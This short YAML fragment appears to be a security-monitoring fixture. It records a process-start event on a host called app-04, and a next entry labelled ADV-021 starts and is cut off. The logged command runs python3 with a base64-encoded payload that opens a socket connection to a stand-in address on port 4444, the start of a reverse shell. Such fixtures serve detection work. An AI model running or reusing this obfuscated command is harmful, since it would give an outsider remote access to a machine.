  events:
  - title: Process creation
    event_type: process.start
    asset_name: app-04
    process_name: python3
    command_line: python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxvcztzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCcyMDMuMC4xMTMuOScsNDQ0NCkp'))"
- id: ADV-021
